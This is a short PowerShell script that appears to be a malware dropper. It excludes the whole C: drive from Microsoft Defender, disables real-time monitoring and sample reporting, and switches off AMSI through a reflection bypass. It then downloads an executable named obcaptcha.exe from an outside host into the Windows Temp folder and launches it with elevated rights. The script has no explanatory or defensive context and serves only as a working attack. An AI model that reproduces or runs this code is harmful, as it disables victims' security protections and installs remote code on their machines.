cls
Add-MpPreference -ExclusionPath "C:\"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting Disable
Set-MpPreference -SubmitSamplesConsent NeverSend

#Disable AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$url = "http://observacs.xyz/dashboard/obcaptcha.exe"
$output = "C:\Windows\Temp\obcaptcha.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

Start-Process -FilePath $output -Verb RunAs
